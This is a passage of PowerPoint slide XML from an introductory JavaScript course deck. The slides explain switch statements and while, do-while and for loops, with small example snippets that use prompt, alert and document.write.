              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>parseInt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>prompt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"Select 1-3"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>""</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>));</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        switch</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x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</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case</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795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>alert</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"Selected 1"</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break</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case</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fall-through to the next case</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRP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case</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795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>alert</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"Selected 2-3"</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break</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default part is optional</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>          </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>alert</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"Wrong selection"</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break</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p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="FFCC00"/>
              </a:buClr>
              <a:buSzPct val="55000"/>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="fi-FI" altLang="fi-FI" sz="2000" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="fi-FI" sz="2000" dirty="0">
              <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:cs typeface="Courier New" panose="020703090202050204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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{44F83389-CDC0-4BF7-A8C2-253F5104A9B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>while loop</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{32BC774B-90DE-4E22-83B2-438EBE1F35CE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Syntax</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>while</a:t>
            </a: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condition</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</a:t>
            </a:r>
          </a:p>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loop</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body</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p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>1</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err="1">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>while</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> &lt;= </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="098658"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>10</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pP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document</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="795E26"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> + </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>br</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;"</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a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>x</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C4F33260-CA77-40A8-8346-17701771E1D3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>do while</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5FDCADDF-11C6-4060-B2FB-43DA24A9F1C2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="77500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>//Same as while-loop. Condition checked at end. Syntax:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>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marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    // loop body</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condition</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marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>// do while is executed once even if the condition is false</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="AF00DB"/>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marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>document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"&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>br</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A31515"/>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pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="001080"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>    x</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Otsikko 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{45E7BE93-02F0-4D5B-B1B7-7C32706E6008}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="fi-FI"/>
              <a:t>for loop</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Sisällön paikkamerkki 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{527B3F41-AF5B-4FE0-8380-AF8F6BF4F7CC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1600200"/>
            <a:ext cx="10972800" cy="4997152"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0">
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>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Syntactic</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sugar</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>while-loop</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Syntax</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</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init</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condition</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adjustment</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loop</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body</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is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>same</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> as:</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init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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>while</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condition</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loop</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body</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adjustment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br>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:b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Any</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part</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init</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>condition</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>adjustment</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>) is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>optional</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>can</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be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omitted</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Example</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a: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AF00DB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>for</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i</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0</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i</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fi-FI" sz="1600" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:effectLst/>
